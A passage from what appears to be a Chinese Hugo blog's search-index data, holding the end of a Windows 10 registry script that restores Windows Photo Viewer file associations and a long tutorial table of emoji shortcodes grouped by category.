PhotoViewer.FileAssoc.Tiff /f reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows Photo Viewer\\Capabilities\\FileAssociations\" /v \".gif\" /t REG_SZ /d PhotoViewer.FileAssoc.Tiff /f reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows Photo Viewer\\Capabilities\\FileAssociations\" /v \".jpg\" /t REG_SZ /d PhotoViewer.FileAssoc.Tiff /f reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows Photo Viewer\\Capabilities\\FileAssociations\" /v \".jpeg\" /t REG_SZ /d PhotoViewer.FileAssoc.Tiff /f reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows Photo Viewer\\Capabilities\\FileAssociations\" /v \".bmp\" /t REG_SZ /d PhotoViewer.FileAssoc.Tiff /f reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows Photo Viewer\\Capabilities\\FileAssociations\" /v \".ico\" /t REG_SZ /d PhotoViewer.FileAssoc.Tiff /f reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows Photo Viewer\\Capabilities\\FileAssociations\" /v \".svg\" /t REG_SZ /d PhotoViewer.FileAssoc.Tiff /f reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows Photo Viewer\\Capabilities\\FileAssociations\" /v \".webp\" /t REG_SZ /d PhotoViewer.FileAssoc.Tiff /f reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows Photo Viewer\\Capabilities\\FileAssociations\" /v \".tif\" /t REG_SZ /d PhotoViewer.FileAssoc.Tiff /f reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows Photo Viewer\\Capabilities\\FileAssociations\" /v \".tiff\" /t REG_SZ /d PhotoViewer.FileAssoc.Tiff /f echo ------------------------------------------------------------ echo 右键选择【打开方式】然后选择【照片查看器】即可 echo; pause ","date":"2015-10-01","objectID":"/20151001/:2:0","tags":["Win10"],"title":"Win10使用Windows照片查看打开图片","uri":"/20151001/"},{"categories":["教程"],"content":"Emoji 支持 Emoji 可以通过多种方式在 Hugo 项目中启用. emojify 方法可以直接在模板中调用, 或者使用行内 Shortcodes. 要全局使用 emoji, 需要在你的网站配置中设置 enableEmoji 为 true, 然后你就可以直接在文章中输入 emoji 的代码. 它们以冒号开头和结尾，并且包含 emoji 的 代码: 去露营啦! :tent: 很快就回来. 真开心! :joy: 呈现的输出效果如下: 去露营啦! ⛺ 很快就回来. 真开心! 😂 以下符号清单是 emoji 代码的非常有用的参考. ","date":"2015-09-02","objectID":"/20150902/:0:0","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"表情与情感 ","date":"2015-09-02","objectID":"/20150902/:1:0","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"笑脸表情 图标 代码 图标 代码 😀 grinning 😃 smiley 😄 smile 😁 grin 😆 laughing satisfied 😅 sweat_smile 🤣 rofl 😂 joy 🙂 slightly_smiling_face 🙃 upside_down_face 😉 wink 😊 blush 😇 innocent ","date":"2015-09-02","objectID":"/20150902/:1:1","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"爱意表情 图标 代码 图标 代码 😍 heart_eyes 😘 kissing_heart 😗 kissing ☺️ relaxed 😚 kissing_closed_eyes 😙 kissing_smiling_eyes ","date":"2015-09-02","objectID":"/20150902/:1:2","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"吐舌头表情 图标 代码 图标 代码 😋 yum 😛 stuck_out_tongue 😜 stuck_out_tongue_winking_eye 😝 stuck_out_tongue_closed_eyes 🤑 money_mouth_face ","date":"2015-09-02","objectID":"/20150902/:1:3","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"带手的表情 图标 代码 图标 代码 🤗 hugs 🤔 thinking ","date":"2015-09-02","objectID":"/20150902/:1:4","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"中性表情 图标 代码 图标 代码 🤐 zipper_mouth_face 😐 neutral_face 😑 expressionless 😶 no_mouth 😏 smirk 😒 unamused 🙄 roll_eyes 😬 grimacing 🤥 lying_face ","date":"2015-09-02","objectID":"/20150902/:1:5","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"困倦的表情 图标 代码 图标 代码 😌 relieved 😔 pensive 😪 sleepy 🤤 drooling_face 😴 sleeping ","date":"2015-09-02","objectID":"/20150902/:1:6","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"不适的表情 图标 代码 图标 代码 😷 mask 🤒 face_with_thermometer 🤕 face_with_head_bandage 🤢 nauseated_face 🤧 sneezing_face 😵 dizzy_face ","date":"2015-09-02","objectID":"/20150902/:1:7","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"戴帽子的表情 图标 代码 图标 代码 🤠 cowboy_hat_face ","date":"2015-09-02","objectID":"/20150902/:1:8","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"戴眼镜的表情 图标 代码 图标 代码 😎 sunglasses 🤓 nerd_face ","date":"2015-09-02","objectID":"/20150902/:1:9","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"担心的表情 图标 代码 图标 代码 😕 confused 😟 worried 🙁 slightly_frowning_face ☹ frowning_face 😮 open_mouth 😯 hushed 😲 astonished 😳 flushed 😦 frowning 😧 anguished 😨 fearful 😰 cold_sweat 😥 disappointed_relieved 😢 cry 😭 sob 😱 scream 😖 confounded 😣 persevere 😞 disappointed 😓 sweat 😩 weary 😫 tired_face ","date":"2015-09-02","objectID":"/20150902/:1:10","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"否定的表情 图标 代码 图标 代码 😤 triumph 😡 pout rage 😠 angry 😈 smiling_imp 👿 imp 💀 skull ☠️ skull_and_crossbones ","date":"2015-09-02","objectID":"/20150902/:1:11","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"特殊打扮的表情 图标 代码 图标 代码 💩 hankey poop shit 🤡 clown_face 👹 japanese_ogre 👺 japanese_goblin 👻 ghost 👽 alien 👾 space_invader 🤖 robot ","date":"2015-09-02","objectID":"/20150902/:1:12","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"猫脸表情 图标 代码 图标 代码 😺 smiley_cat 😸 smile_cat 😹 joy_cat 😻 heart_eyes_cat 😼 smirk_cat 😽 kissing_cat 🙀 scream_cat 😿 crying_cat_face 😾 pouting_cat ","date":"2015-09-02","objectID":"/20150902/:1:13","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"猴脸表情 图标 代码 图标 代码 🙈 see_no_evil 🙉 hear_no_evil 🙊 speak_no_evil ","date":"2015-09-02","objectID":"/20150902/:1:14","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"情感 图标 代码 图标 代码 💋 kiss 💌 love_letter 💘 cupid 💝 gift_heart 💖 sparkling_heart 💗 heartpulse 💓 heartbeat 💞 revolving_hearts 💕 two_hearts 💟 heart_decoration ❣️ heavy_heart_exclamation 💔 broken_heart ❤️ heart 💛 yellow_heart 💚 green_heart 💙 blue_heart 💜 purple_heart 🖤 black_heart 💯 100 💢 anger 💥 boom collision 💫 dizzy 💦 sweat_drops 💨 dash 🕳️ hole 💣 bomb 💬 speech_balloon 👁️‍🗨️ eye_speech_bubble 🗯️ right_anger_bubble 💭 thought_balloon 💤 zzz ","date":"2015-09-02","objectID":"/20150902/:1:15","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"人与身体 ","date":"2015-09-02","objectID":"/20150902/:2:0","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"张开手掌的手势 图标 代码 图标 代码 👋 wave 🤚 raised_back_of_hand 🖐️ raised_hand_with_fingers_splayed ✋ hand raised_hand 🖖 vulcan_salute ","date":"2015-09-02","objectID":"/20150902/:2:1","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"部分手指的手势 图标 代码 图标 代码 👌 ok_hand ✌️ v 🤞 crossed_fingers 🤘 metal 🤙 call_me_hand ","date":"2015-09-02","objectID":"/20150902/:2:2","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"一根手指的手势 图标 代码 图标 代码 👈 point_left 👉 point_right 👆 point_up_2 🖕 fu middle_finger 👇 point_down ☝️ point_up ","date":"2015-09-02","objectID":"/20150902/:2:3","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"握紧的手势 图标 代码 图标 代码 👍 +1 thumbsup 👎 -1 thumbsdown ✊ fist fist_raised 👊 facepunch fist_oncoming punch 🤛 fist_left 🤜 fist_right ","date":"2015-09-02","objectID":"/20150902/:2:4","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"两只手 图标 代码 图标 代码 👏 clap 🙌 raised_hands 👐 open_hands 🤝 handshake 🙏 pray ","date":"2015-09-02","objectID":"/20150902/:2:5","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"握住东西的手势 图标 代码 图标 代码 ✍️ writing_hand 💅 nail_care 🤳 selfie ","date":"2015-09-02","objectID":"/20150902/:2:6","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"身体部位 图标 代码 图标 代码 💪 muscle 👂 ear 👃 nose 👀 eyes 👁️ eye 👅 tongue 👄 lips ","date":"2015-09-02","objectID":"/20150902/:2:7","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"人 图标 代码 图标 代码 👶 baby 👦 boy 👧 girl :blonde_man: blonde_man person_with_blond_hair 👨 man 👩 woman 👱‍♀️ blonde_woman 👴 older_man 👵 older_woman ","date":"2015-09-02","objectID":"/20150902/:2:8","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"身体动作 图标 代码 图标 代码 🙍‍♀️ frowning_woman person_frowning 🙍‍♂️ frowning_man 🙎‍♀️ person_with_pouting_face pouting_woman 🙎‍♂️ pouting_man 🙅‍♀️ ng_woman no_good no_good_woman 🙅‍♂️ ng_man no_good_man 🙆‍♀️ ok_woman 🙆‍♂️ ok_man 💁‍♀️ information_desk_person sassy_woman tipping_hand_woman 💁‍♂️ sassy_man tipping_hand_man 🙋‍♀️ raising_hand raising_hand_woman 🙋‍♂️ raising_hand_man 🙇‍♂️ bow bowing_man 🙇‍♀️ bowing_woman 🤦‍♂️ man_facepalming 🤦‍♀️ woman_facepalming 🤷‍♂️ man_shrugging 🤷‍♀️ woman_shrugging ","date":"2015-09-02","objectID":"/20150902/:2:9","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"人物角色 图标 代码 图标 代码 👨‍⚕️ man_health_worker 👩‍⚕️ woman_health_worker 👨‍🎓 man_student 👩‍🎓 woman_student 👨‍🏫 man_teacher 👩‍🏫 woman_teacher 👨‍⚖️ man_judge 👩‍⚖️ woman_judge 👨‍🌾 man_farmer 👩‍🌾 woman_farmer 👨‍🍳 man_cook 👩‍🍳 woman_cook 👨‍🔧 man_mechanic 👩‍🔧 woman_mechanic 👨‍🏭 man_factory_worker 👩‍🏭 woman_factory_worker 👨‍💼 man_office_worker 👩‍💼 woman_office_worker 👨‍🔬 man_scientist 👩‍🔬 woman_scientist 👨‍💻 man_technologist 👩‍💻 woman_technologist 👨‍🎤 man_singer 👩‍🎤 woman_singer 👨‍🎨 man_artist 👩‍🎨 woman_artist 👨‍✈️ man_pilot 👩‍✈️ woman_pilot 👨‍🚀 man_astronaut 👩‍🚀 woman_astronaut 👨‍🚒 man_firefighter 👩‍🚒 woman_firefighter 👮‍♂️ cop policeman 👮‍♀️ policewoman 🕵 detective male_detective 🕵️‍♀️ female_detective 💂‍♂️ guardsman 💂‍♀️ guardswoman 👷‍♂️ construction_worker construction_worker_man 👷‍♀️ construction_worker_woman 🤴 prince 👸 princess 👳‍♂️ man_with_turban 👳‍♀️ woman_with_turban 👲 man_with_gua_pi_mao 🤵‍♂️ man_in_tuxedo 👰 bride_with_veil 🤰 pregnant_woman ","date":"2015-09-02","objectID":"/20150902/:2:10","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"幻想的人物 图标 代码 图标 代码 👼 angel 🎅 santa 🤶 mrs_claus ","date":"2015-09-02","objectID":"/20150902/:2:11","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"人物活动 图标 代码 图标 代码 💆‍♀️ massage massage_woman 💆‍♂️ massage_man 💇‍♀️ haircut haircut_woman 💇‍♂️ haircut_man 🚶‍♂️ walking walking_man 🚶‍♀️ walking_woman 🏃‍♂️ runner running running_man 🏃‍♀️ running_woman 💃 dancer 🕺 man_dancing 🕴️ business_suit_levitating 👯‍♀️ dancers dancing_women 👯‍♂️ dancing_men ","date":"2015-09-02","objectID":"/20150902/:2:12","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"体育 图标 代码 图标 代码 🤺 person_fencing 🏇 horse_racing ⛷️ skier 🏂 snowboarder 🏌️‍♂️ golfing_man 🏌️‍♀️ golfing_woman 🏄‍♂️ surfer surfing_man 🏄‍♀️ surfing_woman 🚣‍♂️ rowboat rowing_man 🚣‍♀️ rowing_woman 🏊‍♂️ swimmer swimming_man 🏊‍♀️ swimming_woman ⛹️‍♂️ basketball_man ⛹️‍♀️ basketball_woman 🏋️‍♂️ weight_lifting_man 🏋️‍♀️ weight_lifting_woman 🚴‍♂️ bicyclist biking_man 🚴‍♀️ biking_woman 🚵‍♂️ mountain_bicyclist mountain_biking_man 🚵‍♀️ mountain_biking_woman 🤸‍♂️ man_cartwheeling 🤸‍♀️ woman_cartwheeling 🤼‍♂️ men_wrestling 🤼‍♀️ women_wrestling 🤽‍♂️ man_playing_water_polo 🤽‍♀️ woman_playing_water_polo 🤾‍♂️ man_playing_handball 🤾‍♀️ woman_playing_handball 🤹‍♂️ man_juggling 🤹‍♀️ woman_juggling ","date":"2015-09-02","objectID":"/20150902/:2:13","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"休息 图标 代码 图标 代码 🛀 bath 🛌 sleeping_bed ","date":"2015-09-02","objectID":"/20150902/:2:14","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"家庭 图标 代码 图标 代码 👭 two_women_holding_hands 👫 couple 👬 two_men_holding_hands 👩‍❤️‍💋‍👨 couplekiss_man_woman 👨‍❤️‍💋‍👨 couplekiss_man_man 👩‍❤️‍💋‍👩 couplekiss_woman_woman 👩‍❤️‍👨 couple_with_heart couple_with_heart_woman_man 👨‍❤️‍👨 couple_with_heart_man_man 👩‍❤️‍👩 couple_with_heart_woman_woman 👨‍👩‍👦 family family_man_woman_boy 👨‍👩‍👧 family_man_woman_girl 👨‍👩‍👧‍👦 family_man_woman_girl_boy 👨‍👩‍👦‍👦 family_man_woman_boy_boy 👨‍👩‍👧‍👧 family_man_woman_girl_girl 👨‍👨‍👦 family_man_man_boy 👨‍👨‍👧 family_man_man_girl 👨‍👨‍👧‍👦 family_man_man_girl_boy 👨‍👨‍👦‍👦 family_man_man_boy_boy 👨‍👨‍👧‍👧 family_man_man_girl_girl 👩‍👩‍👦 family_woman_woman_boy 👩‍👩‍👧 family_woman_woman_girl 👩‍👩‍👧‍👦 family_woman_woman_girl_boy 👩‍👩‍👦‍👦 family_woman_woman_boy_boy 👩‍👩‍👧‍👧 family_woman_woman_girl_girl 👨‍👦 family_man_boy 👨‍👦‍👦 family_man_boy_boy 👨‍👧 family_man_girl 👨‍👧‍👦 family_man_girl_boy 👨‍👧‍👧 family_man_girl_girl 👩‍👦 family_woman_boy 👩‍👦‍👦 family_woman_boy_boy 👩‍👧 family_woman_girl 👩‍👧‍👦 family_woman_girl_boy 👩‍👧‍👧 family_woman_girl_girl ","date":"2015-09-02","objectID":"/20150902/:2:15","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"人物符号 图标 代码 图标 代码 🗣 speaking_head 👤 bust_in_silhouette 👥 busts_in_silhouette 👣 footprints ","date":"2015-09-02","objectID":"/20150902/:2:16","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"动物与自然 ","date":"2015-09-02","objectID":"/20150902/:3:0","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"哺乳动物 图标 代码 图标 代码 🐵 monkey_face 🐒 monkey 🦍 gorilla 🐶 dog 🐕 dog2 🐩 poodle 🐺 wolf 🦊 fox_face 🐱 cat 🐈 cat2 🦁 lion 🐯 tiger 🐅 tiger2 🐆 leopard 🐴 horse 🐎 racehorse 🦄 unicorn 🦌 deer 🐮 cow 🐂 ox 🐃 water_buffalo 🐄 cow2 🐷 pig 🐖 pig2 🐗 boar 🐽 pig_nose 🐏 ram 🐑 sheep 🐐 goat 🐪 dromedary_camel 🐫 camel 🐘 elephant 🦏 rhinoceros 🐭 mouse 🐁 mouse2 🐀 rat 🐹 hamster 🐰 rabbit 🐇 rabbit2 🐿️ chipmunk 🦇 bat 🐻 bear 🐨 koala 🐼 panda_face 🐾 feet paw_prints ","date":"2015-09-02","objectID":"/20150902/:3:1","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"鸟类 图标 代码 图标 代码 🦃 turkey 🐔 chicken 🐓 rooster 🐣 hatching_chick 🐤 baby_chick 🐥 hatched_chick 🐦 bird 🐧 penguin 🕊 dove 🦅 eagle 🦆 duck 🦉 owl ","date":"2015-09-02","objectID":"/20150902/:3:2","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"两栖动物 icon code icon code 🐸 frog ","date":"2015-09-02","objectID":"/20150902/:3:3","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"爬虫类 图标 代码 图标 代码 🐊 crocodile 🐢 turtle 🦎 lizard 🐍 snake 🐲 dragon_face 🐉 dragon ","date":"2015-09-02","objectID":"/20150902/:3:4","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"海洋动物 图标 代码 图标 代码 🐳 whale 🐋 whale2 🐬 dolphin flipper 🐟 fish 🐠 tropical_fish 🐡 blowfish 🦈 shark 🐙 octopus 🐚 shell ","date":"2015-09-02","objectID":"/20150902/:3:5","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"虫类 图标 代码 图标 代码 🐌 snail 🦋 butterfly 🐛 bug 🐜 ant 🐝 bee honeybee 🪲 beetle 🕷️ spider 🕸️ spider_web 🦂 scorpion ","date":"2015-09-02","objectID":"/20150902/:3:6","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"花类植物 图标 代码 图标 代码 💐 bouquet 🌸 cherry_blossom 💮 white_flower 🏵️ rosette 🌹 rose 🥀 wilted_flower 🌺 hibiscus 🌻 sunflower 🌼 blossom 🌷 tulip ","date":"2015-09-02","objectID":"/20150902/:3:7","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"其它植物 图标 代码 图标 代码 🌱 seedling 🌲 evergreen_tree 🌳 deciduous_tree 🌴 palm_tree 🌵 cactus 🌾 ear_of_rice 🌿 herb ☘️ shamrock 🍀 four_leaf_clover 🍁 maple_leaf 🍂 fallen_leaf 🍃 leaves ","date":"2015-09-02","objectID":"/20150902/:3:8","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"食物与饮料 ","date":"2015-09-02","objectID":"/20150902/:4:0","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"水果 图标 代码 图标 代码 🍇 grapes 🍈 melon 🍉 watermelon 🍊 mandarin orange tangerine 🍋 lemon 🍌 banana 🍍 pineapple 🍎 apple 🍏 green_apple 🍐 pear 🍑 peach 🍒 cherries 🍓 strawberry 🥝 kiwi_fruit 🍅 tomato ","date":"2015-09-02","objectID":"/20150902/:4:1","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"蔬菜 图标 代码 图标 代码 🥑 avocado 🍆 eggplant 🥔 potato 🥕 carrot 🌽 corn 🌶️ hot_pepper 🥒 cucumber 🍄 mushroom 🥜 peanuts 🌰 chestnut ","date":"2015-09-02","objectID":"/20150902/:4:2","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"快餐 图标 代码 图标 代码 🍞 bread 🥐 croissant 🥖 baguette_bread 🥞 pancakes 🧀 cheese 🍖 meat_on_bone 🍗 poultry_leg 🥓 bacon 🍔 hamburger 🍟 fries 🍕 pizza 🌭 hotdog 🌮 taco 🌯 burrito 🥙 stuffed_flatbread 🥚 egg 🍳 fried_egg 🥘 shallow_pan_of_food 🍲 stew 🥗 green_salad 🍿 popcorn ","date":"2015-09-02","objectID":"/20150902/:4:3","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"亚洲食物 图标 代码 图标 代码 🍱 bento 🍘 rice_cracker 🍙 rice_ball 🍚 rice 🍛 curry 🍜 ramen 🍝 spaghetti 🍠 sweet_potato 🍢 oden 🍣 sushi 🍤 fried_shrimp 🍥 fish_cake 🍡 dango ","date":"2015-09-02","objectID":"/20150902/:4:4","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"海鲜 图标 代码 图标 代码 🦀 crab 🦐 shrimp 🦑 squid ","date":"2015-09-02","objectID":"/20150902/:4:5","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"甜点 图标 代码 图标 代码 🍦 icecream 🍧 shaved_ice 🍨 ice_cream 🍩 doughnut 🍪 cookie 🎂 birthday 🍰 cake 🍫 chocolate_bar 🍬 candy 🍭 lollipop 🍮 custard 🍯 honey_pot ","date":"2015-09-02","objectID":"/20150902/:4:6","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"饮料 图标 代码 图标 代码 🍼 baby_bottle 🥛 milk_glass ☕ coffee 🍵 tea 🍶 sake 🍾 champagne 🍷 wine_glass 🍸 cocktail 🍹 tropical_drink 🍺 beer 🍻 beers 🥂 clinking_glasses 🥃 tumbler_glass ","date":"2015-09-02","objectID":"/20150902/:4:7","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"餐具 图标 代码 图标 代码 🍽️ plate_with_cutlery 🍴 fork_and_knife 🥄 spoon 🔪 hocho knife 🏺 amphora ","date":"2015-09-02","objectID":"/20150902/:4:8","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"旅游与地理 ","date":"2015-09-02","objectID":"/20150902/:5:0","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"地图 图标 代码 图标 代码 🌍 earth_africa 🌎 earth_americas 🌏 earth_asia 🌐 globe_with_meridians 🗺️ world_map 🗾 japan ","date":"2015-09-02","objectID":"/20150902/:5:1","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"地理现象 图标 代码 图标 代码 🏔 mountain_snow ⛰️ mountain 🌋 volcano 🗻 mount_fuji 🏕️ camping ⛱ beach_umbrella 🏜️ desert 🏝️ desert_island 🏞️ national_park ","date":"2015-09-02","objectID":"/20150902/:5:2","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"建筑物 图标 代码 图标 代码 🏟️ stadium 🏛️ classical_building 🏗️ building_construction 🏘 houses 🏚 derelict_house 🏠 house 🏡 house_with_garden 🏢 office 🏣 post_office 🏤 european_post_office 🏥 hospital 🏦 bank 🏨 hotel 🏩 love_hotel 🏪 convenience_store 🏫 school 🏬 department_store 🏭 factory 🏯 japanese_castle 🏰 european_castle 💒 wedding 🗼 tokyo_tower 🗽 statue_of_liberty ","date":"2015-09-02","objectID":"/20150902/:5:3","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"宗教建筑 图标 代码 图标 代码 ⛪ church 🕌 mosque 🕍 synagogue ⛩️ shinto_shrine 🕋 kaaba ","date":"2015-09-02","objectID":"/20150902/:5:4","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"其它地点 图标 代码 图标 代码 ⛲ fountain ⛺ tent 🌁 foggy 🌃 night_with_stars 🏙️ cityscape 🌄 sunrise_over_mountains 🌅 sunrise 🌆 city_sunset 🌇 city_sunrise 🌉 bridge_at_night ♨️ hotsprings 🎠 carousel_horse 🎡 ferris_wheel 🎢 roller_coaster 💈 barber 🎪 circus_tent ","date":"2015-09-02","objectID":"/20150902/:5:5","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"陆路运输 图标 代码 图标 代码 🚂 steam_locomotive 🚃 railway_car 🚄 bullettrain_side 🚅 bullettrain_front 🚆 train2 🚇 metro 🚈 light_rail 🚉 station 🚊 tram 🚝 monorail 🚞 mountain_railway 🚋 train 🚌 bus 🚍 oncoming_bus 🚎 trolleybus 🚐 minibus 🚑 ambulance 🚒 fire_engine 🚓 police_car 🚔 oncoming_police_car 🚕 taxi 🚖 oncoming_taxi 🚗 car red_car 🚘 oncoming_automobile 🚙 blue_car 🚚 truck 🚛 articulated_lorry 🚜 tractor 🏎️ racing_car 🏍 motorcycle 🛵 motor_scooter 🚲 bike 🛴 kick_scooter 🚏 busstop 🛣️ motorway 🛤️ railway_track 🛢️ oil_drum ⛽ fuelpump 🚨 rotating_light 🚥 traffic_light 🚦 vertical_traffic_light 🛑 stop_sign 🚧 construction ","date":"2015-09-02","objectID":"/20150902/:5:6","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"水路运输 图标 代码 图标 代码 ⚓ anchor ⛵ boat sailboat 🛶 canoe 🚤 speedboat 🛳️ passenger_ship ⛴️ ferry 🛥️ motor_boat 🚢 ship ","date":"2015-09-02","objectID":"/20150902/:5:7","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"空中运输 图标 代码 图标 代码 ✈️ airplane 🛩️ small_airplane 🛫 flight_departure 🛬 flight_arrival 💺 seat 🚁 helicopter 🚟 suspension_railway 🚠 mountain_cableway 🚡 aerial_tramway 🛰️ artificial_satellite 🚀 rocket ","date":"2015-09-02","objectID":"/20150902/:5:8","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"旅馆 icon code icon code 🛎️ bellhop_bell ","date":"2015-09-02","objectID":"/20150902/:5:9","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"时间 图标 代码 图标 代码 ⌛ hourglass ⏳ hourglass_flowing_sand ⌚ watch ⏰ alarm_clock ⏱️ stopwatch ⏲️ timer_clock 🕰️ mantelpiece_clock 🕛 clock12 🕧 clock1230 🕐 clock1 🕜 clock130 🕑 clock2 🕝 clock230 🕒 clock3 🕞 clock330 🕓 clock4 🕟 clock430 🕔 clock5 🕠 clock530 🕕 clock6 🕡 clock630 🕖 clock7 🕢 clock730 🕗 clock8 🕣 clock830 🕘 clock9 🕤 clock930 🕙 clock10 🕥 clock1030 🕚 clock11 🕦 clock1130 ","date":"2015-09-02","objectID":"/20150902/:5:10","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"天空与天气 图标 代码 图标 代码 🌑 new_moon 🌒 waxing_crescent_moon 🌓 first_quarter_moon 🌔 moon waxing_gibbous_moon 🌕 full_moon 🌖 waning_gibbous_moon 🌗 last_quarter_moon 🌘 waning_crescent_moon 🌙 crescent_moon 🌚 new_moon_with_face 🌛 first_quarter_moon_with_face 🌜 last_quarter_moon_with_face 🌡️ thermometer ☀️ sunny 🌝 full_moon_with_face 🌞 sun_with_face ⭐ star 🌟 star2 🌠 stars 🌌 milky_way ☁️ cloud ⛅ partly_sunny ⛈ cloud_with_lightning_and_rain 🌤 sun_behind_small_cloud 🌥 sun_behind_large_cloud 🌦 sun_behind_rain_cloud 🌧 cloud_with_rain 🌨 cloud_with_snow 🌩 cloud_with_lightning 🌪️ tornado 🌫️ fog 🌬 wind_face 🌀 cyclone 🌈 rainbow 🌂 closed_umbrella ☂️ open_umbrella ☂️ umbrella ⛱️ parasol_on_ground ⚡ zap ❄️ snowflake ☃️ snowman_with_snow ☃️ snowman ☄️ comet 🔥 fire 💧 droplet 🌊 ocean ","date":"2015-09-02","objectID":"/20150902/:5:11","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"活动 ","date":"2015-09-02","objectID":"/20150902/:6:0","tags":["语法"],"title":"Emoji 支持","uri":"/20150902/"},{"categories":["教程"],"content":"事件 图标 代码 图标 代码 🎃 jack_o_lantern 🎄 christmas_tree 🎆 fireworks 🎇 sparkler ✨ sparkles 🎈 balloon 🎉 tada 🎊 confetti_ball 🎋 tanabata_tree 🎍 bamboo 🎎 dolls 🎏 flags 🎐 wind_chime 🎑 rice_scene 🎀 ribbon 🎁 gift 🎗️ reminder_ribbon 🎟 tickets 🎫 ticket ","date":"2015-09-02","objectID":"/20150902/:6:1","tags":["语法"],"title":"Emoji 